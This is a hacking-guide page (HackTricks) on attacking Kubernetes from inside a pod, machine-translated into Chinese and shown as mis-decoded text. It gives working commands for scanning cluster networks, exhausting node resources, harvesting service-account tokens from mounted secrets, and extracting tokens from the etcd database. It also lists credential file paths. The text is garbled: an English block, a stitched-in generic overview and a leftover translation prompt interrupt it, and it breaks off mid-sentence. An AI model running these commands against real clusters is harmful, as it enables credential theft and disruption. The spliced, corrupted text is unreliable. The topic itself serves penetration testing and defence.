# ä»Podå†…éƒ¨æ”»å‡»Kubernetes

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **Podé€ƒé€¸**

**å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œä½ å¯èƒ½èƒ½å¤Ÿä»Podä¸­é€ƒé€¸åˆ°èŠ‚ç‚¹ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### ä»Podä¸­é€ƒé€¸

ä¸ºäº†å°è¯•ä»Podä¸­é€ƒé€¸ï¼Œæ‚¨å¯èƒ½éœ€è¦é¦–å…ˆ**æå‡ç‰¹æƒ**ï¼Œæœ‰ä¸€äº›æŠ€æœ¯å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

æ‚¨å¯ä»¥æ£€æŸ¥è¿™äº›**Dockeré€ƒé€¸**æ¥å°è¯•é€ƒç¦»æ‚¨å·²ç»å…¥ä¾µçš„Podï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### æ»¥ç”¨Kubernetesç‰¹æƒ

å¦‚åœ¨å…³äº**Kubernetesæšä¸¾**çš„éƒ¨åˆ†æ‰€è¿°ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ï¼ŒPodsåœ¨å…¶å†…éƒ¨è¿è¡Œä¸€ä¸ª**æœåŠ¡è´¦æˆ·ä»¤ç‰Œ**ã€‚è¿™ä¸ªæœåŠ¡è´¦æˆ·å¯èƒ½é™„åŠ äº†ä¸€äº›**ç‰¹æƒ**ï¼Œæ‚¨å¯ä»¥**æ»¥ç”¨**è¿™äº›ç‰¹æƒæ¥**ç§»åŠ¨**åˆ°å…¶ä»–Podsï¼Œç”šè‡³**é€ƒé€¸**åˆ°é›†ç¾¤å†…é…ç½®çš„èŠ‚ç‚¹ã€‚äº†è§£å¦‚ä½•æ“ä½œï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### æ»¥ç”¨äº‘ç‰¹æƒ

å¦‚æœPodåœ¨**äº‘ç¯å¢ƒ**ä¸­è¿è¡Œï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿä»å…ƒæ•°æ®ç«¯ç‚¹**æ³„æ¼ä»¤ç‰Œ**å¹¶ä½¿ç”¨å®ƒæ¥æå‡ç‰¹æƒã€‚

## æœç´¢æ˜“å—æ”»å‡»çš„ç½‘ç»œæœåŠ¡

ç”±äºæ‚¨ä½äºKubernetesç¯å¢ƒä¸­ï¼Œå¦‚æœæ‚¨æ— æ³•æ»¥ç”¨å½“å‰Podçš„ç‰¹æƒæˆ–æ— æ³•é€ƒç¦»å®¹å™¨ï¼Œæ‚¨åº”è¯¥**æœç´¢æ½œåœ¨æ˜“å—æ”»å‡»çš„æœåŠ¡**ã€‚

### æœåŠ¡

**ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥å°è¯•è·å–Kubernetesç¯å¢ƒä¸­çš„æ‰€æœ‰æœåŠ¡ï¼š**
```
kubectl get svc --all-namespaces
```
é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubernetesä½¿ç”¨æ‰å¹³çš„ç½‘ç»œæ¶æ„ï¼Œè¿™æ„å‘³ç€**é›†ç¾¤ä¸­çš„ä»»ä½•Pod/Serviceéƒ½å¯ä»¥ç›¸äº’é€šä¿¡**ã€‚**å‘½åç©ºé—´**åœ¨é»˜è®¤æƒ…å†µä¸‹**æ²¡æœ‰ä»»ä½•ç½‘ç»œå®‰å…¨é™åˆ¶**ã€‚å‘½åç©ºé—´ä¸­çš„ä»»ä½•äººéƒ½å¯ä»¥ä¸å…¶ä»–å‘½åç©ºé—´é€šä¿¡ã€‚

### æ‰«æ

ä»¥ä¸‹Bashè„šæœ¬ï¼ˆæ¥è‡ª[Kuberneteså·¥ä½œåŠ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ï¼‰å°†å®‰è£…å¹¶æ‰«æKubernetesé›†ç¾¤çš„IPèŒƒå›´ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
è¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼Œäº†è§£å¦‚ä½•æ”»å‡»Kubernetesç‰¹å®šæœåŠ¡ä»¥ä¾µå…¥å…¶ä»–Pod/æ•´ä¸ªç¯å¢ƒï¼š

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### å—…æ¢

å¦‚æœ**è¢«å…¥ä¾µçš„Podæ­£åœ¨è¿è¡Œä¸€äº›æ•æ„ŸæœåŠ¡**ï¼Œå…¶ä»–Podéœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å—…æ¢æœ¬åœ°é€šä¿¡**æ¥è·å–å…¶ä»–Podå‘é€çš„å‡­æ®ã€‚

## ç½‘ç»œæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¸å¦‚**ARPæ¬ºéª—**ï¼ˆä»¥åŠç”±æ­¤å¼•å‘çš„**DNSæ¬ºéª—**ï¼‰ç­‰æŠ€æœ¯åœ¨Kubernetesç½‘ç»œä¸­èµ·ä½œç”¨ã€‚ç„¶åï¼Œåœ¨ä¸€ä¸ªPodå†…éƒ¨ï¼Œå¦‚æœæ‚¨å…·æœ‰**NET_RAWåŠŸèƒ½**ï¼ˆé»˜è®¤æƒ…å†µä¸‹å­˜åœ¨ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿå‘é€è‡ªå®šä¹‰çš„ç½‘ç»œæ•°æ®åŒ…å¹¶é€šè¿‡ARPæ¬ºéª—å¯¹åŒä¸€èŠ‚ç‚¹ä¸­è¿è¡Œçš„æ‰€æœ‰Podæ‰§è¡Œ**ä¸­é—´äººæ”»å‡»**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœ**æ¶æ„Pod**æ­£åœ¨ä¸**DNSæœåŠ¡å™¨**è¿è¡Œåœ¨**åŒä¸€èŠ‚ç‚¹**ä¸Šï¼Œæ‚¨å°†èƒ½å¤Ÿå¯¹é›†ç¾¤ä¸­çš„æ‰€æœ‰Podæ‰§è¡Œ**DNSæ¬ºéª—æ”»å‡»**ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## èŠ‚ç‚¹æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰

Kubernetesæ¸…å•ä¸­æ²¡æœ‰èµ„æºè§„èŒƒå’Œå®¹å™¨çš„**é™åˆ¶èŒƒå›´**ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬å¯ä»¥**æ¶ˆè€—Pod/éƒ¨ç½²è¿è¡Œçš„æ‰€æœ‰èµ„æº**ï¼Œä½¿å…¶ä»–èµ„æºé¥¥é¥¿ï¼Œå¹¶å¯¼è‡´ç¯å¢ƒçš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚

å¯ä»¥ä½¿ç”¨è¯¸å¦‚[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)çš„å·¥å…·æ¥å®ç°æ­¤ç›®çš„ï¼š
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
æ‚¨å¯ä»¥åœ¨è¿è¡Œ`stress-ng`ä¹‹å‰å’Œä¹‹åçœ‹åˆ°å·®å¼‚ã€‚
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## èŠ‚ç‚¹åæ¸—é€

å¦‚æœä½ æˆåŠŸ**é€ƒç¦»å®¹å™¨**ï¼Œä½ ä¼šåœ¨èŠ‚ç‚¹ä¸Šå‘ç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼š

* å®¹å™¨è¿è¡Œæ—¶è¿›ç¨‹ï¼ˆDockerï¼‰
* åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ›´å¤š**Pod/å®¹å™¨**ï¼Œä½ å¯ä»¥åƒè¿™ä¸ªä¸€æ ·æ»¥ç”¨ï¼ˆæ›´å¤šä»¤ç‰Œï¼‰
* æ•´ä¸ª**æ–‡ä»¶ç³»ç»Ÿ**å’Œ**æ“ä½œç³»ç»Ÿ**ä¸€èˆ¬
* æ­£åœ¨ç›‘å¬çš„**Kube-Proxy**æœåŠ¡
* æ­£åœ¨ç›‘å¬çš„**Kubelet**æœåŠ¡ã€‚æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼š
* ç›®å½•ï¼š`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* å…¶ä»–**Kuberneteså¸¸è§æ–‡ä»¶**ï¼š
* `$HOME/.kube/config` - **ç”¨æˆ·é…ç½®**
* `/etc/kubernetes/kubelet.conf`- **å¸¸è§„é…ç½®**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **å¼•å¯¼é…ç½®**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcdé…ç½®**
* `/etc/kubernetes/pki` - **Kuberneteså¯†é’¥**

### æŸ¥æ‰¾èŠ‚ç‚¹kubeconfig

å¦‚æœä½ åœ¨ä¹‹å‰æåˆ°çš„è·¯å¾„ä¸­æ‰¾ä¸åˆ°kubeconfigæ–‡ä»¶ï¼Œè¯·**æ£€æŸ¥kubeletè¿›ç¨‹çš„`--kubeconfig`å‚æ•°**ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### å·å–æœºå¯†ä¿¡æ¯

To steal secrets from within a Kubernetes pod, you can use various techniques. Here are a few methods:

1. **Pod-to-Pod Communication**: If the target pod has network access to other pods, you can exploit this communication channel to intercept and steal sensitive information.

2. **Pod Misconfiguration**: Check if the pod is misconfigured and allows unauthorized access to its filesystem. If so, you can navigate through the pod's file system and search for any files containing sensitive data.

3. **API Access**: If the pod has access to the Kubernetes API server, you can use this access to retrieve secrets stored in Kubernetes Secrets or ConfigMaps.

4. **Environment Variables**: Check if the pod's environment variables contain any sensitive information. You can access these variables from within the pod and extract the data.

5. **Logs**: Analyze the pod's logs for any potential leakage of sensitive information. Sometimes, developers may inadvertently log sensitive data, providing an opportunity for exploitation.

Remember, stealing secrets from within a pod requires careful reconnaissance and understanding of the pod's configuration and environment.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
è„šæœ¬[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)å°†è‡ªåŠ¨è·å–å…¶ä»–Podçš„ä»¤ç‰Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦å…·æœ‰æ‚¨æ­£åœ¨æŸ¥æ‰¾çš„æƒé™ï¼ˆè€Œä¸æ˜¯æ‚¨é€ä¸ªæŸ¥æ‰¾ï¼‰ã€‚
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æƒçš„DaemonSets

DaemonSetæ˜¯ä¸€ä¸ª**pod**ï¼Œå°†åœ¨**é›†ç¾¤çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œ**ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªDaemonSeté…ç½®äº†ä¸€ä¸ª**ç‰¹æƒçš„æœåŠ¡è´¦æˆ·**ï¼Œåœ¨**æ‰€æœ‰èŠ‚ç‚¹**ä¸Šä½ å°†èƒ½å¤Ÿæ‰¾åˆ°è¯¥**ç‰¹æƒæœåŠ¡è´¦æˆ·**çš„**ä»¤ç‰Œ**ï¼Œä½ å¯ä»¥æ»¥ç”¨å®ƒã€‚

è¿™ä¸ªæ¼æ´ä¸å‰ä¸€èŠ‚ä¸­çš„æ¼æ´ç›¸åŒï¼Œä½†ç°åœ¨ä½ ä¸å†ä¾èµ–è¿æ°”ã€‚

### åˆ‡æ¢åˆ°äº‘ç«¯

å¦‚æœé›†ç¾¤ç”±äº‘æœåŠ¡ç®¡ç†ï¼Œé€šå¸¸**èŠ‚ç‚¹å¯¹å…ƒæ•°æ®ç«¯ç‚¹çš„è®¿é—®æƒé™ä¸Podä¸åŒ**ã€‚å› æ­¤ï¼Œå°è¯•ä»èŠ‚ç‚¹ï¼ˆæˆ–ä»hostNetworkä¸ºTrueçš„Podï¼‰**è®¿é—®å…ƒæ•°æ®ç«¯ç‚¹**ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### çªƒå–etcd

å¦‚æœä½ å¯ä»¥æŒ‡å®šå°†è¿è¡Œå®¹å™¨çš„èŠ‚ç‚¹çš„[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ï¼Œåœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹å†…è·å–ä¸€ä¸ªshellå¹¶è·å–**etcdæ•°æ®åº“**ï¼š
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
æ§åˆ¶å¹³é¢èŠ‚ç‚¹å…·æœ‰**ä¸»èŠ‚ç‚¹è§’è‰²**ï¼Œåœ¨**äº‘æ‰˜ç®¡é›†ç¾¤ä¸­ï¼Œæ‚¨å°†æ— æ³•åœ¨è¿™äº›èŠ‚ç‚¹ä¸Šè¿è¡Œä»»ä½•å†…å®¹**ã€‚

#### ä»etcdä¸­è¯»å–ç§˜å¯†

å¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨podè§„èŒƒä¸­çš„`nodeName`é€‰æ‹©å™¨åœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šè¿è¡Œæ‚¨çš„podï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½å¾ˆå®¹æ˜“è®¿é—®`etcd`æ•°æ®åº“ï¼Œè¯¥æ•°æ®åº“åŒ…å«äº†é›†ç¾¤çš„æ‰€æœ‰é…ç½®ï¼ŒåŒ…æ‹¬æ‰€æœ‰ç§˜å¯†ã€‚

ä¸‹é¢æ˜¯ä¸€ç§å¿«é€Ÿè€Œç®€å•çš„æ–¹æ³•ï¼Œå¯ä»¥ä»æ­£åœ¨è¿è¡Œçš„æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šçš„`etcd`ä¸­è·å–ç§˜å¯†ã€‚å¦‚æœæ‚¨æƒ³è¦ä¸€ä¸ªæ›´ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥ä½¿ç”¨`etcdctl`ä½œä¸º`etcd`å®¢æˆ·ç«¯å®ç”¨ç¨‹åºï¼Œåœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹çš„å‡­æ®ä¸‹è¿æ¥åˆ°etcdçš„ä»»ä½•ä½ç½®ï¼Œå¯ä»¥æŸ¥çœ‹@mauilionçš„[ç¤ºä¾‹æ¸…å•](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ã€‚

**æ£€æŸ¥`etcd`æ˜¯å¦åœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œå¹¶æŸ¥çœ‹æ•°æ®åº“æ‰€åœ¨ä½ç½®ï¼ˆè¿™æ˜¯åœ¨`kubeadm`åˆ›å»ºçš„é›†ç¾¤ä¸Šï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# ä»Podå†…éƒ¨æ”»å‡»Kubernetes

åœ¨Kubernetesé›†ç¾¤ä¸­ï¼ŒPodæ˜¯æœ€å°çš„å¯éƒ¨ç½²å•å…ƒã€‚Podæ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ç»„æˆçš„ï¼Œå®ƒä»¬å…±äº«ç›¸åŒçš„ç½‘ç»œå‘½åç©ºé—´å’Œå­˜å‚¨å·ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿé€šè¿‡åœ¨Podå†…éƒ¨æ‰§è¡Œæ¶æ„æ“ä½œæ¥æ”»å‡»Kubernetesé›†ç¾¤ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›ä»Podå†…éƒ¨æ”»å‡»Kubernetesçš„æŠ€æœ¯ï¼š

## 1. åˆ©ç”¨å®¹å™¨é€ƒé€¸

æ”»å‡»è€…å¯ä»¥å°è¯•åˆ©ç”¨å®¹å™¨é€ƒé€¸æŠ€æœ¯æ¥ä»Podå†…éƒ¨è®¿é—®å®¿ä¸»æœºæ“ä½œç³»ç»Ÿã€‚è¿™å¯ä»¥é€šè¿‡åˆ©ç”¨å®¹å™¨è¿è¡Œæ—¶çš„æ¼æ´æˆ–é…ç½®é”™è¯¯æ¥å®ç°ã€‚ä¸€æ—¦æ”»å‡»è€…æˆåŠŸé€ƒé€¸å‡ºå®¹å™¨ï¼Œä»–ä»¬å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç”šè‡³è®¿é—®æ•´ä¸ªKubernetesé›†ç¾¤ã€‚

## 2. æ¨ªå‘ç§»åŠ¨

ä¸€æ—¦æ”»å‡»è€…æˆåŠŸè¿›å…¥ä¸€ä¸ªPodï¼Œä»–ä»¬å¯ä»¥å°è¯•åœ¨é›†ç¾¤å†…è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨Kubernetesçš„APIå’ŒæœåŠ¡å‘ç°åŠŸèƒ½æ¥å‘ç°å…¶ä»–Podï¼Œå¹¶å°è¯•åˆ©ç”¨å®ƒä»¬çš„æ¼æ´æˆ–å¼±ç‚¹è¿›è¡Œæ”»å‡»ã€‚

## 3. çªƒå–æ•æ„Ÿä¿¡æ¯

æ”»å‡»è€…å¯ä»¥åœ¨Podå†…éƒ¨æ‰§è¡Œä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚è®¿é—®ä»¤ç‰Œã€å¯†ç ã€è¯ä¹¦ç­‰ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥ç”¨äºè¿›ä¸€æ­¥çš„æ”»å‡»ï¼Œå¦‚è®¿é—®å…¶ä»–Podæˆ–é›†ç¾¤èµ„æºã€‚

## 4. ç¯¡æ”¹æˆ–ç ´ååº”ç”¨ç¨‹åº

æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æˆ–ç ´åPodå†…éƒ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹åº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ã€ç¯¡æ”¹åº”ç”¨ç¨‹åºçš„ä»£ç æˆ–ç ´ååº”ç”¨ç¨‹åºçš„è¿è¡Œç¯å¢ƒæ¥å®ç°ã€‚è¿™å¯èƒ½å¯¼è‡´åº”ç”¨ç¨‹åºçš„å´©æºƒã€æ•°æ®æ³„éœ²æˆ–å…¶ä»–å®‰å…¨é—®é¢˜ã€‚

è¦é˜²æ­¢ä»Podå†…éƒ¨æ”»å‡»Kubernetesï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- é™åˆ¶Podçš„æƒé™ï¼Œç¡®ä¿Podåªèƒ½è®¿é—®å¿…è¦çš„èµ„æºå’ŒæœåŠ¡ã€‚
- ä½¿ç”¨å®¹å™¨è¿è¡Œæ—¶çš„å®‰å…¨åŠŸèƒ½ï¼Œå¦‚Seccompå’ŒAppArmorï¼Œæ¥é™åˆ¶å®¹å™¨çš„è¡Œä¸ºã€‚
- å®šæœŸæ›´æ–°å’Œä¿®è¡¥å®¹å™¨é•œåƒï¼Œä»¥é˜²æ­¢å·²çŸ¥çš„æ¼æ´å’Œå®‰å…¨é—®é¢˜ã€‚
- ç›‘æ§å’Œå®¡è®¡Podçš„æ´»åŠ¨ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œå“åº”æ½œåœ¨çš„æ”»å‡»ã€‚

äº†è§£è¿™äº›æ”»å‡»æŠ€æœ¯å’Œé˜²å¾¡æªæ–½å¯ä»¥å¸®åŠ©æ‚¨æ›´å¥½åœ°ä¿æŠ¤Kubernetesé›†ç¾¤å…å—å†…éƒ¨æ”»å‡»çš„å¨èƒã€‚
```bash
data-dir=/var/lib/etcd
```
**æŸ¥çœ‹ etcd æ•°æ®åº“ä¸­çš„æ•°æ®ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ä»æ•°æ®åº“ä¸­æå–ä»¤ç‰Œå¹¶æ˜¾ç¤ºæœåŠ¡è´¦æˆ·åç§°**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ç›¸åŒçš„å‘½ä»¤ï¼Œä½†ä½¿ç”¨ä¸€äº›grepå‘½ä»¤åªè¿”å›kube-systemå‘½åç©ºé—´ä¸­çš„é»˜è®¤ä»¤ç‰Œ**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
ä»¥ä¸‹æ˜¯ä¸€æœ¬å…³äºé»‘å®¢æŠ€æœ¯çš„ä¹¦ç±ä¸­çš„å†…å®¹ã€‚ä»¥ä¸‹å†…å®¹æ¥è‡ªæ–‡ä»¶/hive/hacktricks-cloud/pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod.mdã€‚å°†ç›¸å…³çš„è‹±æ–‡æ–‡æœ¬ç¿»è¯‘æˆä¸­æ–‡ï¼Œå¹¶è¿”å›ç¿»è¯‘ç»“æœï¼Œä¿æŒå®Œå…¨ç›¸åŒçš„markdownå’Œhtmlè¯­æ³•ã€‚ä¸è¦ç¿»è¯‘ä»£ç ã€é»‘å®¢æŠ€æœ¯åç§°ã€é»‘å®¢æœ¯è¯­ã€äº‘/SaaSå¹³å°åç§°ï¼ˆå¦‚Workspaceã€awsã€gcp...ï¼‰ã€æ³„æ¼ä¸€è¯ã€æ¸—é€æµ‹è¯•å’Œmarkdownæ ‡ç­¾ã€‚æ­¤å¤–ï¼Œè¯·ä¸è¦æ·»åŠ ä»»ä½•é¢å¤–çš„å†…å®¹ï¼Œåªéœ€æä¾›ç¿»è¯‘å’Œmarkdownè¯­æ³•å³å¯ã€‚
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### é™æ€/é•œåƒåŒ–Podçš„æŒä¹…æ€§

_é™æ€Pod_ç”±ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„kubeletå®ˆæŠ¤ç¨‹åºç›´æ¥ç®¡ç†ï¼Œè€Œæ— éœ€APIæœåŠ¡å™¨è§‚å¯Ÿå®ƒä»¬ã€‚ä¸ç”±æ§åˆ¶å¹³é¢ç®¡ç†çš„Podï¼ˆä¾‹å¦‚ï¼Œéƒ¨ç½²ï¼‰ä¸åŒï¼›ç›¸åï¼Œ**kubeletä¼šç›‘è§†æ¯ä¸ªé™æ€Pod**ï¼ˆå¦‚æœå¤±è´¥ï¼Œåˆ™é‡æ–°å¯åŠ¨å®ƒï¼‰ã€‚

å› æ­¤ï¼Œé™æ€Podå§‹ç»ˆ**ç»‘å®šåˆ°ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„ä¸€ä¸ªKubelet**ã€‚

**kubeletä¼šè‡ªåŠ¨å°è¯•åœ¨Kubernetes APIæœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªé•œåƒPod**ï¼Œè¿™æ„å‘³ç€åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„Podåœ¨APIæœåŠ¡å™¨ä¸Šå¯è§ï¼Œä½†æ— æ³•ä»é‚£é‡Œè¿›è¡Œæ§åˆ¶ã€‚Podåç§°å°†ä»¥èŠ‚ç‚¹ä¸»æœºåä¸ºåç¼€ï¼Œå¹¶å¸¦æœ‰å‰å¯¼è¿å­—ç¬¦ã€‚

{% hint style="danger" %}
é™æ€Podçš„**`spec`ä¸èƒ½å¼•ç”¨å…¶ä»–APIå¯¹è±¡**ï¼ˆä¾‹å¦‚ï¼ŒServiceAccountã€ConfigMapã€Secretç­‰ï¼‰ã€‚å› æ­¤ï¼Œ**æ— æ³•åˆ©ç”¨æ­¤è¡Œä¸ºåœ¨å½“å‰èŠ‚ç‚¹ä¸Šå¯åŠ¨å…·æœ‰ä»»æ„serviceAccountçš„Pod**æ¥ç ´åé›†ç¾¤ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•åœ¨ä¸åŒçš„å‘½åç©ºé—´ä¸­è¿è¡ŒPodï¼ˆå¦‚æœæœ‰æŸç§åŸå› éœ€è¦ï¼‰ã€‚
{% endhint %}

å¦‚æœæ‚¨åœ¨èŠ‚ç‚¹ä¸»æœºå†…éƒ¨ï¼Œå¯ä»¥è®©å…¶åˆ›å»ºä¸€ä¸ª**é™æ€Pod**ã€‚è¿™éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸æ‚¨åœ¨ä¸åŒçš„å‘½åç©ºé—´ï¼ˆå¦‚**kube-system**ï¼‰ä¸­åˆ›å»ºä¸€ä¸ªPodã€‚

è¦åˆ›å»ºé™æ€Podï¼Œ[**æ–‡æ¡£æ˜¯å¾ˆå¥½çš„å¸®åŠ©**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚æ‚¨åŸºæœ¬ä¸Šéœ€è¦ä¸¤ä»¶äº‹ï¼š

